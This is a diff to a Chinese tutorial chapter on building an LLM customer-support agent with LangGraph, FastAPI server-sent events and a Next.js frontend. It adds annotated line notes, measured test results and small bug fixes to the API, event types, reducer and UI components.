@@ -46,6 +46,15 @@ Day 47 的节点这样算成本:开始前读一下 LLMClient 账本的累计值,
         return replace(self, llm=llm, small_llm=small)
 ```
 
+<div class="line-notes">
+
+- `def fresh(self) -> "Deps":` 返回类型写成字符串 `"Deps"`,因为在类体里引用自己时类还没定义完,这叫前向引用。每个 HTTP 请求进来,`_graph()` 都会调一次它。
+- `llm = LLMClient(self.settings, model=self.llm.model)` 新建一个客户端,模型名沿用原来的(我的 .env 里是 `deepseek-flash`),账本从 0 开始记。
+- `small = llm if self.small_llm is self.llm else` 没配小模型时,`from_conn()` 里 `small_llm` 和 `llm` 是同一个对象。新的这份也要保持"是同一个对象",否则 `spent()` 里的 `is not` 判断失效,同一笔花费会被加两次。
+- `return replace(self, llm=llm, small_llm=small)` `dataclasses.replace` 是浅拷贝:retriever、call_tool 这些字段还是原来那个对象,只有两个客户端换成新的。实测审批那次请求只跑 approval、finalize 两个不调模型的节点,done 里的 `cost_cny` 和审批前一样是 0.03198,没有混进别的请求的钱。
+
+</div>
+
 `dataclasses.replace` 复制一个 dataclass 并替换指定字段,其余字段共享同一个对象。创建 `LLMClient` 只是创建一个 openai SDK 客户端对象,很便宜。
 
 我写 Day 47 时没想到这个问题,是写今天的接口时想到"多个请求同时跑会怎样"才发现的。做服务化时,把每个"全局共享"的对象都过一遍"并发时会不会串",这个习惯很值钱。
@@ -196,10 +205,62 @@ def list_approvals() -> list[dict]:
 @app.post("/approvals/{ticket_id}")
 def decide(ticket_id: str, d: Decision):
     graph = _graph()
-    if "approval" not in graph.get_state(_cfg(ticket_id)).next:
+    snap = graph.get_state(_cfg(ticket_id))
+    if not snap.values:  # checkpointer 里没有这个 thread:工单不存在或者从没跑过
+        raise HTTPException(404, "工单不存在或还没有处理过")
+    if "approval" not in snap.next:
         raise HTTPException(409, "这个工单不在等待审批")
     return _sse(_events(graph, Command(resume=d.model_dump()), ticket_id))
 ```
+
+<div class="line-notes">
+
+- `"""HTTP 接口。启动:` 文件开头把六个接口列一遍,打开文件就知道这个服务能干什么。我实跑时本机 8000 被占了,用的是 `--port 8049`,前端的 `NEXT_PUBLIC_SUPPORTPILOT_API` 也跟着改成 8049。
+- `from langgraph.types import Command` 审批恢复要用 `Command(resume=...)`,把审批结果作为 approval 节点里 `interrupt()` 的返回值送回去。
+- `from sse_starlette import EventSourceResponse` 负责 SSE 的格式、心跳和断线检测。实测它返回的响应头是 `content-type: text/event-stream; charset=utf-8`、`cache-control: no-store`、`x-accel-buffering: no`,最后一个是让 nginx 别缓冲。
+- `from starlette.concurrency import iterate_in_threadpool` 把同步生成器搬到线程池里一步一步取,下面 `_sse()` 用。
+- `R: dict = {}` 进程级的资源袋。放一个模块级字典,lifespan 里往里放、接口里取,不用写 `global`。
+- `@asynccontextmanager` lifespan 的写法:`yield` 之前的代码在服务启动时跑,之后的在服务关闭时跑。
+- `R["conn"] = connect()` 一条 psycopg 连接全进程共用,正文说过 Day 53 会换成连接池。
+- `R["saver"] = make_checkpointer()` Postgres 版的 checkpointer。第一次会建表,实测临时库里多了 `checkpoints`、`checkpoint_writes`、`checkpoint_blobs`、`checkpoint_migrations` 四张。工单停在审批时,状态就存在这几张表里,服务重启也不丢。
+- `R["deps"] = Deps.from_conn(R["conn"])` 基础 deps 只建一次,检索器的 BM25 索引在内存里,建一次就够。
+- `R["conn"].close()` `yield` 之后:服务关闭时把连接关掉。
+- `allow_origins=os.getenv("SUPPORTPILOT_WEB_ORIGINS"` 允许哪些前端来源,逗号分隔。实测用 TestClient 发预检:Origin 是默认的 `http://localhost:3000` 返回 200,带 `access-control-allow-origin: http://localhost:3000`;Origin 换成 `http://evil.example` 返回 400 `Disallowed CORS origin`。我的前端开在 3049,启动时设了 `SUPPORTPILOT_WEB_ORIGINS=http://localhost:3049`。
+- `allow_headers=["content-type", "accept"],` 前端 fetch 只带这两个请求头(见 `sse.ts`),多放行没用。
+- `subject: str = Field(max_length=200)` 超长的请求在进函数之前就被 pydantic 拦下,返回 422,不会写进数据库。
+- `class Decision(BaseModel):` 审批的请求体。实测漏传 approver,只发 `{"approved": true}`,返回 422,detail 里是 `"loc": ["body", "approver"], "msg": "Field required"`。
+- `def _graph():` 每个请求现编译一张图:deps 用 `fresh()` 拿新账本,checkpointer 共用。
+- `return {"configurable": {"thread_id": ticket_id}}` thread_id 直接用工单号,checkpointer 靠它区分工单。实测踩到一个坑:`seed_db.py` 重新造数后工单号又从 T000153 开始,但 checkpoint 表没清,新工单会接上旧工单的状态。重新造数时要把 checkpoint 那几张表一起 truncate。
+- `def _events(graph, payload, ticket_id: str):` 整个接口层的核心:把 LangGraph 的流翻译成前端认识的六种事件。
+- `for mode, chunk in graph.stream(payload, _cfg(ticket_id), stream_mode=["updates", "custom"]):` 两种模式一起要,每个元素是 `(模式, 数据)` 二元组。实测一张真实的退款工单,这个循环一共吐了 9 个节点更新、1 个 `__interrupt__`,外加 259 条 custom(5 个 step、3 个 tool、251 个 token),前后 16.7 秒。
+- `if mode == "custom":` custom 是节点里 `_emit()` 推的字典,自带 `type` 字段。
+- `yield {"event": chunk["type"], "data": json.dumps(chunk, ensure_ascii=False)}` 直接拿 `type` 当 SSE 的事件名。实测第一条是 `event: step` / `data: {"type": "step", "node": "load_customer", "found": true}`。`ensure_ascii=False` 让中文原样输出,不加的话每个 token 都是一串 `\u` 转义。
+- `for node, update in chunk.items():` updates 模式的数据是 `{节点名: 这个节点返回的更新}`。
+- `if node == "__interrupt__":` 图停在 `interrupt()` 处时,LangGraph 用这个特殊键报告。
+- `yield {"event": "interrupt", "data": json.dumps(update[0].value` `update` 是 Interrupt 对象组成的元组,`.value` 就是 approval 节点传给 `interrupt()` 的字典。实测里面有 type、ticket_id、request、draft、needs_finance_review 五个键;request 是 `RF-T000153-INV-202609-0002`、950.0 元、规则 `annual_first_14_days`,needs_finance_review 是 false(950 没过 1000 的复核线)。`default=str` 不能省:request 里的 `created_at` 是 datetime,json 不认识,要转成字符串。
+- `yield {"event": "node", "data": json.dumps({"node": node}` 其他节点只推名字,不推整份更新,因为更新里有整段草稿和工具结果,太大了。实测这一轮的顺序是 load_customer、prepare_context、classify、retrieve、act、draft、check、draft、check:质检退回过一次,draft 和 check 各跑了两遍。
+- `yield {"event": "done", "data": json.dumps(_summary(graph, ticket_id)` 循环结束(跑完了或者停在 interrupt)再推一条 done。注意节点里抛异常时,生成器直接中断,done 不会推。我重建项目时漏配了 Day 46 加的 `console_url`,act 节点调 `create_refund_request` 时报 AttributeError,curl 收到 3 个 tool 事件后连接就断了:没有 done,也没有任何错误事件。这就是练习 7 要补 error 事件的原因。
+- `snap = graph.get_state(_cfg(ticket_id))` 从 checkpointer 读这张工单的最新状态。
+- `return {"ticket_id": ticket_id, "outcome": v.get("outcome") or ("waiting_approval" if snap.next else None),` outcome 只有 finalize 和 handoff 才写。停在审批时还没写,就用 `snap.next` 不为空推断成 waiting_approval。实测停在审批时 `snap.next` 是 `('approval',)`。
+- `"tool_log": v.get("tool_log", []), "cost_cny": round(v.get("cost_cny", 0.0), 5),` 实测停在审批时 tool_log 有 3 条,cost_cny 是 0.04563,reply 是 None(还没定稿)。
+- `"waiting_on": list(snap.next)}` tuple 转成 list,JSON 才认。实测是 `["approval"]`。
+- `return EventSourceResponse(iterate_in_threadpool(gen))` 同步生成器包进线程池,事件循环不会被一张工单的十几秒卡住。
+- `def create_ticket(t: NewTicket) -> dict:` 实测 curl 建工单返回 `{"ticket_id":"T000153"}`,种子数据里已经有 152 张工单。
+- `raise HTTPException(404, "ticket not found")` 工单号在 biz.tickets 里查不到。
+- `return _sse(_events(_graph(), {"ticket": dict(row)}, ticket_id))` 第一轮的输入只有 ticket 这一个字段。`dict(row)` 是因为 psycopg 的行对象不能直接塞进状态。
+- `if not snap.values:` 没跑过的工单在 checkpointer 里没有状态,`values` 是空字典。
+- `raise HTTPException(409, "工单还在等待审批` 实测停在审批时追问「多久能到账?」,返回 409 `{"detail":"工单还在等待审批,审批完成后才能继续对话"}`。
+- `return _sse(_events(graph, {"turns": [{"role": "customer", "content": m.content}]}, ticket_id))` 追问只追加一条 turns。turns 在 Day 48 的 state 里是用 `operator.add` 累加的,所以这里给一条就是加一条,不是覆盖。
+- `"SELECT r.*, t.subject, c.name AS customer_name FROM biz.refund_requests r "` 实测返回一条:id `RF-T000153-INV-202609-0002`、customer_name 李娜、amount_cny 950.0、rule `annual_first_14_days`、subject 想退款、status pending、created_at `2026-10-22 07:54:05.306872+08:00`,另外 decided_by、decided_at、note 三个是 null。
+- `"WHERE r.status = 'pending' ORDER BY r.created_at").fetchall()` 只看退款申请的状态,不管工单还在不在等审批。实测碰到过一次:那张工单质检两次没过、转了人工(outcome 是 escalated),但 act 节点已经把退款申请建好了,它照样出现在待审批列表里,客服点"通过"拿到 409。
+- `return [biz._jsonable(r) | {"created_at": str(r["created_at"])} for r in rows]` `_jsonable` 把 Decimal 这类类型转成 JSON 认识的,`|` 合并字典(3.9+),再把 created_at 单独转成字符串。
+- `snap = graph.get_state(_cfg(ticket_id))` 先取一次状态,下面两个判断都用它。
+- `if not snap.values:` 不存在的 thread 的 values 是空字典,next 也是空的。只判断 next 的话,"工单不存在"和"工单存在但不在等审批"都会返回 409,前端分不清。这里先单独拦下来。
+- `raise HTTPException(404, "工单不存在或还没有处理过")` 实测审批 `NOPE` 返回 404 `{"detail":"工单不存在或还没有处理过"}`。
+- `if "approval" not in snap.next:` 实测审批完再批一次,返回 409 `这个工单不在等待审批`。
+- `return _sse(_events(graph, Command(resume=d.model_dump()), ticket_id))` `model_dump()` 把 Decision 转成字典,成为 approval 节点里 `interrupt()` 的返回值。实测审批这次的流只有三条:node approval、node finalize、done,done 里 outcome 是 resolved。
+
+</div>
 
 六个接口,对应工单的生命周期:
 
@@ -345,7 +406,8 @@ web/
 // supportpilot/web/src/lib/events.ts
 // 和后端 api/app.py 的 _events() 一一对应。改后端事件就先改这里,让 TypeScript 帮你找漏掉的地方。
 
-export type ToolEvent = { type: "tool"; name: string; args: Record<string, unknown>; error: string | null };
+// args 是模型原样给的 JSON 字符串(Day 47 act 节点直接转发 call["arguments"]),error 只是"有没有出错"
+export type ToolEvent = { type: "tool"; name: string; args: string; error: boolean };
 
 export type StepEvent =
   | { type: "step"; node: "load_customer"; found: boolean }
@@ -392,6 +454,24 @@ export const STEP_NAMES: Record<string, string> = {
   handoff: "转人工",
 };
 ```
+
+<div class="line-notes">
+
+- `export type ToolEvent` `args` 是字符串、`error` 是布尔值。实测真后端推的是 `{"type": "tool", "name": "list_invoices", "args": "{\"customer_id\": \"C0002\", \"limit\": 10}", "error": false}`。我最早写成 `Record<string, unknown>` 和 `string | null`,接上真后端才发现不对,经过见工具卡片那一节。
+- `export type StepEvent =` 联合类型,每个 `|` 开头的一行是一种形状。
+- `| { type: "step"; node: "classify"; category: string }` `node` 写成字面量类型 `"classify"`,TypeScript 靠它判断这一支有 category 字段。实测数据是 `{"type": "step", "node": "classify", "category": "refund"}`。
+- `| { type: "step"; node: "retrieve"; docs: string[] }` 实测 docs 是检索到的 5 个切块各自所属的文章 id,有重复:`["KB-refund-001", "KB-refund-002", "KB-refund-001", "KB-refund-001", "KB-plans-002"]`。
+- `| { type: "step"; node: "check"; passed: boolean; problems: string[] }` 实测一次退回的 problems 是:「草稿最后一句"审核通过后会原路退回"中的退款到账方式"原路退回",在帮助中心资料和调查结论中均无依据,属于未证实的细节承诺」。
+- `| { type: "step"; node: string; [k: string]: unknown };` 兜底分支:任意节点名、任意字段。代价是 TypeScript 没法只看 node 就确定是哪一支,所以 reducer 里要再用 `"passed" in e.data` 确认一次。
+- `export type RefundRequest = { id: string; amount_cny: number; rule: string; reason?: string };` `reason?` 表示可选。实测后端的 request 还带 invoice_id、customer_id、status、created_at 等字段,类型里没写的字段 TypeScript 不管,运行时照样在对象上。
+- `export type Summary = {` 和后端 `_summary()` 的返回一一对应。
+- `export type AgentEvent =` 按 `event` 字段区分的联合类型,也叫可辨识联合。`switch (e.event)` 之后,每个 case 里 `e.data` 的类型是确定的。
+- `| { event: "token"; data: { type: "token"; text: string } }` 实测 token 是模型一次吐出的一小段,一张工单前十个是 "您好"、"，"、"已"、"查到"、"您的"、"账户"、"及"、"该"、"笔"、"账单",一共 251 个。
+- `data: { type: "refund_approval"; ticket_id: string; request: RefundRequest; needs_finance_review: boolean };` 实测后端还多推了一个 `draft`(当时的草稿全文),类型里没声明,前端也用不上。
+- `| { event: "error"; data: { message: string } };` 后端现在还不推,先写上,练习 7 补后端。
+- `export const STEP_NAMES: Record<string, string> = {` 节点名翻成中文。`Record<string, string>` 允许查不到,所以 RunView 里写的是 `STEP_NAMES[node] ?? node`。
+
+</div>
 
 `AgentEvent` 是一个按 `event` 字段区分的联合类型。reducer 里 `switch (e.event)` 之后,TypeScript 知道每个分支里 `e.data` 长什么样,写错字段名会直接编译失败。`step` 那一组最后留了一个宽松的兜底分支,因为节点以后可能会推新的细节,前端不认识就忽略,别因为后端多推了一个字段就崩。
 
@@ -444,6 +524,26 @@ export async function* streamEvents(
   }
 }
 ```
+
+<div class="line-notes">
+
+- `import { EventSourceParserStream } from "eventsource-parser/stream";` 4.1.1 的流式接口。它是一个 TransformStream:进去的是文本,出来的是一条条 `{event, data, id}` 事件对象。
+- `export class ApiError extends Error {` 自定义错误,多带一个 HTTP 状态码。
+- `public status: number,` 构造函数参数前加 `public`,TypeScript 会自动生成同名属性,相当于 `this.status = status`。这叫参数属性。
+- `export async function* streamEvents(` `async function*` 是异步生成器:里面能 await,也能 yield,外面用 `for await` 一个个取。
+- `method: init.method ?? "POST",` `??` 只在 undefined 或 null 时用默认值,空字符串不会被替换。
+- `headers: { "content-type": "application/json", accept: "text/event-stream" },` 正好是后端 CORS 的 `allow_headers` 里放行的两个。
+- `body: init.body === undefined ? undefined : JSON.stringify(init.body),` run 接口不带请求体;追问带 `{content}`;审批带 `{approved, approver, note}`。
+- `signal: init.signal,` 点停止时 abort,fetch 和正在等的 `read()` 都会抛 AbortError。
+- `const detail = await res.json().then((j) => j.detail, () => res.statusText);` `then` 的第二个参数是失败回调:响应体不是 JSON 时退回 statusText。实测停在审批时追问,拿到的 detail 是「工单还在等待审批,审批完成后才能继续对话」。
+- `throw new ApiError(res.status, typeof detail === "string" ? detail : JSON.stringify(detail));` 422 的 detail 是数组(每个字段的校验错误),要转成字符串。
+- `const reader = res.body.pipeThrough(new TextDecoderStream()).pipeThrough(new EventSourceParserStream()).getReader();` 字节 → 文本 → 事件,两次 `pipeThrough`。实测真后端每行用 `\r\n` 结尾(`event: step\r\ndata: {...}\r\n\r\n`),假后端用 `\n`,解析器两种都认。
+- `const { done, value: msg } = await reader.read();` 解构的同时把 `value` 改名成 `msg`。
+- `if (done) return;` 流结束,生成器结束,外面的 `for await` 自然退出。
+- `yield { event: msg.event, data: JSON.parse(msg.data) } as AgentEvent;` `as AgentEvent` 是断言,不是校验:后端推什么就当成什么。tool 事件的形状和最初写的类型对不上,TypeScript 一声没吭,就是因为这里的 `as`。
+- `reader.releaseLock();` 写在 finally 里,正常结束、出错、被 abort 都会释放读锁。
+
+</div>
 
 这几十行里有几个细节值得说。
 
@@ -499,6 +599,19 @@ export const decide = (
 ) => streamEvents(`${API}/approvals/${ticketId}`, { body: d, signal });
 ```
 
+<div class="line-notes">
+
+- `export const API = process.env.NEXT_PUBLIC_SUPPORTPILOT_API ?? "http://localhost:8000";` 构建时被替换成字面量。实测我用 `NEXT_PUBLIC_SUPPORTPILOT_API=http://localhost:8049 npx next dev -p 3049` 起,浏览器发出的四个请求都打到 `http://localhost:8049/...`:POST /tickets、POST /tickets/T000153/run、GET /tickets/T000153、POST /tickets/T000153/messages。
+- `async function json<T>(path: string, init?: RequestInit): Promise<T> {` 泛型 `T` 由调用方指定返回的形状,比如 `json<Summary>(...)`。
+- `const res = await fetch(API + path, { ...init, headers: { "content-type": "application/json", ...init?.headers } });` `...init?.headers` 是可选链加展开:init 没传时展开的是 undefined,什么都不加。
+- `return res.json() as Promise<T>;` 同样是断言,不校验。
+- `export type PendingRefund = RefundRequest & {` `&` 是交叉类型,两边的字段合在一起。
+- `json<{ ticket_id: string }>("/tickets", { method: "POST", body: JSON.stringify(t) });` 实测返回 `{"ticket_id":"T000153"}`。
+- `export const runTicket = (id: string, signal: AbortSignal) => streamEvents(` 返回的是生成器。调用的那一刻还没发请求,第一次取值时才真正 fetch。
+- `export const decide = (` 审批也是 POST + SSE,所以同样走 `streamEvents`,不能用 EventSource。
+
+</div>
+
 API 地址从 `NEXT_PUBLIC_SUPPORTPILOT_API` 读。Next.js 只会把 `NEXT_PUBLIC_` 开头的环境变量打进浏览器端的代码,而且是在**构建时**替换成字面量,不是运行时读。所以部署时换 API 地址要重新 build,这个和后端读环境变量的习惯不一样,第一次部署经常栽在这。
 
 前后端不同源(3000 和 8000),浏览器会先发 OPTIONS 预检请求。接口设计那一节给 FastAPI 加的 `CORSMiddleware` 就是为这个。另一种做法是用 Next.js 的 rewrites 把 `/api/*` 代理到后端,同源就没有跨域问题,但开发服务器转发 SSE 时可能缓冲,我没用这条路。
@@ -549,7 +662,10 @@ type Action =
 
 function stepDetail(e: Extract<AgentEvent, { event: "step" }>["data"]): string | undefined {
   if (e.node === "classify" && "category" in e) return `分类:${String(e.category)}`;
-  if (e.node === "retrieve" && "docs" in e && Array.isArray(e.docs)) return `命中 ${e.docs.length} 篇:${e.docs.join("、")}`;
+  if (e.node === "retrieve" && "docs" in e && Array.isArray(e.docs)) {
+    const docs = [...new Set(e.docs)]; // 后端按切块推,同一篇文章的几个块会重复出现
+    return `命中 ${docs.length} 篇:${docs.join("、")}`;
+  }
   if (e.node === "load_customer" && "found" in e) return e.found ? "找到客户" : "没找到这个邮箱对应的客户";
   return undefined;
 }
@@ -620,6 +736,34 @@ export function useRun() {
   return { state, start, stop, apply };
 }
 ```
+
+<div class="line-notes">
+
+- `"use client";` Next.js App Router 里的模块默认在服务端渲染,用到 `useReducer` 这类 hook 的要声明成客户端模块。
+- `export type RunStatus =` 六个状态,对应正文那张状态图。
+- `function stepDetail(e: Extract<AgentEvent, { event: "step" }>["data"]): string | undefined {` `Extract` 从联合类型里挑出 event 是 "step" 的那个成员,再用 `["data"]` 取它的 data 类型,也就是 StepEvent。
+- `if (e.node === "classify" && "category" in e) return` 实测得到「分类:refund」。
+- `const docs = [...new Set(e.docs)];` Set 去重,再展开回数组,顺序保持第一次出现的顺序。实测 `["KB-refund-003", "KB-refund-001", "KB-plans-002", "KB-refund-001", "KB-refund-001"]` 去重后剩 3 个。我一开始没去重,页面上写着「命中 5 篇」,其中 3 个其实是同一篇。
+- `命中 ${docs.length} 篇` 实测显示「命中 3 篇:KB-refund-003、KB-refund-001、KB-plans-002」。
+- `if (e.node === "load_customer" && "found" in e)` 实测 lina@example.com 能找到,显示「找到客户」。
+- `export function reducer(s: RunState, a: Action): RunState {` 纯函数,同样的输入一定是同样的输出。下面的实测值就是我用 Node 直接调这个函数、喂真实事件拿到的。
+- `return { ...initial, status: "running" };` 实测 start 之后:status 是 running,其余字段全是初始值。
+- `return s.status === "running" ? { ...s, status: "stopped" } : s;` 已经结束的运行再 abort 不改状态。实测对一个 waiting_approval 的状态发 stopped,返回的就是原对象(`===` 为 true),React 也就不会重新渲染。
+- `return { ...s, steps: [...s.steps, e.data.node] };` 实测事件顺序是先 step(load_customer, found: true)再 node(load_customer):step 到了之后 steps 还是 `[]`,details 已经有 `{load_customer: "找到客户"}`;node 到了,steps 才变成 `["load_customer"]`。
+- `if (e.data.node === "check" && "passed" in e.data && e.data.passed === false) {` 质检没过才清草稿,通过的那次不动。
+- `return { ...s, draft: "", rewrites: s.rewrites + 1 };` 实测草稿打到 "您好，" 时收到 passed: false,draft 变成空串,rewrites 从 0 变 1。真模型那次,第一版草稿结尾是「审核通过后会原路退回」,被质检以"原路退回没有依据"退回;第二版改成了「审批结果出来后,我们会再通知您」。
+- `return detail ? { ...s, details: { ...s.details, [e.data.node]: detail } } : s;` `[e.data.node]` 是计算属性名,用变量的值当键。stepDetail 返回 undefined 的(比如 check passed: true)直接返回原状态。
+- `return { ...s, draft: s.draft + e.data.text };` 打字机就是不停地拼字符串。
+- `return { ...s, approval: { request: e.data.request, needsFinanceReview: e.data.needs_finance_review } };` 顺手把后端的下划线命名转成驼峰。
+- `status: e.data.outcome === "waiting_approval" ? "waiting_approval" : "done",` 实测停在审批的那次,done 之后 status 变成 waiting_approval。
+- `const ctrl = useRef<AbortController | null>(null);` 用 useRef 存控制器:改它不触发渲染,又能在多次渲染之间保留。
+- `const start = useCallback(async (open: (signal: AbortSignal) => AsyncGenerator<AgentEvent>) => {` 传进来的是"怎么打开流"的函数,不是流本身。这样 start 能先建好 AbortController,再把 signal 交给它。
+- `for await (const e of open(c.signal)) dispatch({ type: "event", e });` 每来一个事件就 dispatch 一次。`{ type: "event", e }` 是 `{ type: "event", e: e }` 的简写。
+- `if (c.signal.aborted) dispatch({ type: "stopped" });` 实测追问时点停止,状态行变成「已停止接收」,假后端那边打印 `client disconnected`。
+- `else dispatch({ type: "fail", message: err instanceof ApiError ? err.message : "连接中断,请稍后重试" });` 不是主动停的才算出错。后端 409 的中文提示原样显示,网络断了才用兜底文案。
+- `const apply = useCallback((e: AgentEvent) => dispatch({ type: "event", e }), []);` 实测客户页点「刷新进展」:GET /tickets/T000153 拿到 outcome 是 resolved 的摘要,当成 done 塞进来,状态行变成「已完成 · 花费 ¥0.03198」,追问框恢复可用。
+
+</div>
 
 <figure>
 <svg viewBox="0 0 640 220" role="img" aria-label="一次运行的状态机">
@@ -712,7 +856,11 @@ export function RunView({ state, id, onStop }: { state: RunState; id: string; on
         {running && <li className="pending">…</li>}
       </ol>
 
-      {state.rewrites > 0 && <p className="note">质检退回 {state.rewrites} 次,正在重写回复</p>}
+      {state.rewrites > 0 && (
+        <p className="note">
+          质检退回 {state.rewrites} 次{running && ",正在重写回复"}
+        </p>
+      )}
 
       {state.tools.length > 0 && <ul className="tools">{state.tools.map((t, i) => <ToolCard key={i} tool={t} />)}</ul>}
 
@@ -744,6 +892,31 @@ export function RunView({ state, id, onStop }: { state: RunState; id: string; on
 }
 ```
 
+<div class="line-notes">
+
+- `const STATUS_TEXT: Record<RunState["status"], string> = {` `RunState["status"]` 取出那个六选一的类型。用它当 Record 的键,六个状态一个都不能少,漏写一个就编译失败。
+- `export function RunView({ state, id, onStop }` 参数直接解构 props。`onStop?` 可选:历史轮次不传,也就不显示停止按钮。
+- `if (state.status === "idle") return null;` 还没开始的运行什么都不画。
+- `const final = state.summary?.reply;` `?.` 可选链:summary 是 null 时整个表达式是 undefined,不会报错。
+- `<section className="run" aria-busy={running}` 实测停在审批之后,aria-busy 是 "false"。
+- `aria-live="polite"` 只有这一行会被读屏软件播报。实测它先后显示「处理中」(第 0.1 秒)和「已提交审批,等客服处理 · 花费 ¥0.03198」(第 10.2 秒),中间的 251 个 token 一个都不播。
+- `{state.summary &&` summary 到了才显示花费,跑的过程中不显示。
+- `{state.steps.map((node, i) => (` 实测 10.2 秒时列表是:✓查客户档案 · 找到客户、✓整理上下文、✓分诊 · 分类:refund、✓检索帮助中心 · 命中 3 篇、✓查业务数据、✓起草回复、✓质检。
+- `{STEP_NAMES[node] ?? node}` 不认识的节点名原样显示,不至于空着。
+- `{state.details[node] &&` step 事件带来的细节按节点名挂在对应的那一行后面。
+- `{running && <li className="pending">…</li>}` 跑的时候末尾挂一个省略号,表示后面还有。
+- `{state.rewrites > 0 && (` 实测跑的过程中显示「质检退回 1 次,正在重写回复」,结束后变成「质检退回 1 次」。我最早没判断 running,结束了还挂着"正在重写回复",是看截图发现的:那张工单质检退回 2 次后转了人工,页面上写着「已完成」,下面却是「质检退回 2 次,正在重写回复」。
+- `质检退回 {state.rewrites} 次{running && ",正在重写回复"}` running 是 false 时,`{false}` 在 React 里什么都不渲染。
+- `{state.tools.length > 0 &&` 实测 4 张卡片:list_invoices、list_subscriptions、check_refund_eligibility 是查询,create_refund_request 是写操作。
+- `退款申请 {state.approval.request.id}` 实测显示「退款申请 RF-T000153-INV-202609-0002(¥950)已提交」。
+- `{state.approval.needsFinanceReview &&` 950 元没超过 1000 元的复核线,这半句不显示。
+- `{final ? (` 有定稿就显示定稿(带引用),没有就显示打字机里的草稿。
+- `aria-hidden={running}>` 实测停在审批时这个段落的 class 是 `reply-body draft`,aria-hidden 是 "false",读屏软件可以读草稿了。
+- `{!running && <span className="muted">草稿,审批后定稿:</span>}` 实测这段文字是「草稿,审批后定稿:您好,您这笔 Pro 年付是首次购买,付款日 2026-09-24,目前是第 7 天……」。
+- `<p className="error" role="alert">` `role="alert"` 的内容一出现就会被播报。
+
+</div>
+
 `RunView` 分四块:顶部状态和花费、步骤列表、工具卡片、正文。正文有两种形态:跑的过程中显示打字机里的草稿;收到 `done` 之后,如果摘要里有 `reply`,换成后端定稿的回复(带引用)。停在审批时还没有定稿,继续显示草稿,并标明"草稿,审批后定稿",免得客户以为这就是最终答复。
 
 ```tsx
@@ -752,6 +925,15 @@ import type { ToolEvent } from "@/lib/events";
 
 // 写操作给客服看要醒目,和只读查询区分开
 const WRITES = new Set(["create_refund_request", "escalate_to_human"]);
+
+// 参数是模型给的 JSON 字符串:能解析就排版,解析不了(模型偶尔会给坏 JSON)就原样显示
+function pretty(args: string): string {
+  try {
+    return JSON.stringify(JSON.parse(args), null, 2);
+  } catch {
+    return args;
+  }
+}
 
 export function ToolCard({ tool }: { tool: ToolEvent }) {
   const write = WRITES.has(tool.name);
@@ -763,13 +945,29 @@ export function ToolCard({ tool }: { tool: ToolEvent }) {
       </div>
       <details>
         <summary>参数</summary>
-        <pre>{JSON.stringify(tool.args, null, 2)}</pre>
+        <pre>{pretty(tool.args)}</pre>
       </details>
-      {tool.error && <p className="tool-err">{tool.error}</p>}
+      {tool.error && <p className="tool-err">工具返回了错误,Agent 会看到错误信息再决定下一步</p>}
     </li>
   );
 }
 ```
+
+<div class="line-notes">
+
+- `const WRITES = new Set(["create_refund_request", "escalate_to_human"]);` 只决定显示样式。权限在后端 Day 46 的工具分级里管,前端改了这一行也调不了不该调的工具。
+- `function pretty(args: string): string {` 参数现在是字符串,单独写个函数,先排版再显示。
+- `return JSON.stringify(JSON.parse(args), null, 2);` 先解析再排版。实测 `"{\"customer_id\": \"C0002\", \"limit\": 10}"` 变成两格缩进的三行。
+- `} catch {` catch 后面不写变量是 ES2019 起的写法,用不到错误对象就不用声明。
+- `return args;` 模型偶尔会给不合法的 JSON,解析失败就原样显示,不让整个卡片崩掉。
+- `write ? "tool-write" : ""` 实测 create_refund_request 那张卡片的 class 是 `tool tool-write `,查询卡片是 `tool  `。多出来的空格是空字符串拼的,不影响样式。
+- `<span className="tool-tag">` 实测四张卡片的标签依次是 查询、查询、查询、写操作。
+- `<pre>{pretty(tool.args)}</pre>` 修之前这里写的是 `JSON.stringify(tool.args, null, 2)`,对一个字符串再编码一次。实测参数框里显示的是 `"{\"customer_id\": \"C0002\"}"`,外面一圈引号,里面全是反斜杠。
+- `{tool.error && <p className="tool-err">` error 是布尔值。原来写的是 `{tool.error}`,想显示错误文字,但 React 遇到 true 什么都不渲染,出错的卡片下面会是一个空段落。具体的错误文字在后端的 tool_log 里,客服要看可以走 GET /tickets/{id}。
+
+</div>
+
+注意 `args` 的类型。Day 47 的 act 节点推 tool 事件时,`args` 直接用的是模型返回的 `call["arguments"]`,那是一段 JSON **字符串**,`error` 是 `call_tool` 返回的布尔值。我最早按"参数对象 + 错误文字"写的类型,假后端也照这个形状造数据,界面看着一切正常;接上真后端才发现参数框里显示的是 `"{\"customer_id\": \"C0002\"}"`,被编码了两遍。所以假后端的数据形状一定要从真后端抓一份来对,别凭记忆写。
 
 工具卡片默认只显示工具名,参数折叠在 `<details>` 里。客服排查时点开看,客户不会被一屏 JSON 吓到。写操作(创建退款申请、转人工)用另一种底色,和只读查询一眼区分开。这个"写操作清单"在前端只是用来**显示**,真正的权限控制在后端 Day 46 的工具分级里,前端不能当安全边界。
 
@@ -805,6 +1003,19 @@ export function splitCitations(body: string): (string | number)[] {
   return body.split(/\[(\d+)\]/).map((part, i) => (i % 2 === 1 ? Number(part) : part));
 }
 ```
+
+<div class="line-notes">
+
+- `const FOOTER = "\n\n参考文章:\n";` 和后端 `render_sources()` 拼的格式一字不差。实测审批通过后的定稿一共 327 个字符,这个分隔符在第 152 个字符处。
+- `const LINE = /^\[(\d+)\]\s+(.+?)\s+(https?:\/\/\S+)$/;` 三个捕获组:编号、标题、链接。`(.+?)` 是非贪婪匹配,配合后面的 `\s+(https?...)$`,标题里有空格(「年付超过 14 天怎么退」)也能正确切开。实测 `[1] 退款政策总览 https://help.cloudledger.example/help/refund/001` 匹配出 `["1", "退款政策总览", "https://help.cloudledger.example/help/refund/001"]`。
+- `if (at < 0) return { body: reply, sources: [] };` 实测传一句没有参考文章的回复,body 原样返回,sources 是空数组。转人工那句固定回复「您好,您的问题已经转给人工客服同事……」就走这里。
+- `for (const line of reply.slice(at + FOOTER.length).split("\n")) {` 实测切出四行:两行参考文章、一个空行、一行"补充:……"。
+- `if (m) sources.push({ n: Number(m[1]), title: m[2], url: m[3] });` 实测 sources 是 `[{n: 1, title: "退款政策总览", url: ".../refund/001"}, {n: 2, title: "年付超过 14 天怎么退", url: ".../refund/003"}]`。
+- `else if (line.trim()) tail.push(line);` 实测 tail 只有一行:「补充:您的退款申请已审核通过,950.0 元将原路退回,到账时间以支付渠道为准。」950.0 带个小数点,是因为后端 approval 节点直接拼了一个 float。
+- `const body = reply.slice(0, at) + (tail.length ? "\n\n" + tail.join("\n") : "");` 把"补充"那句挪回正文末尾,参考文章单独放。
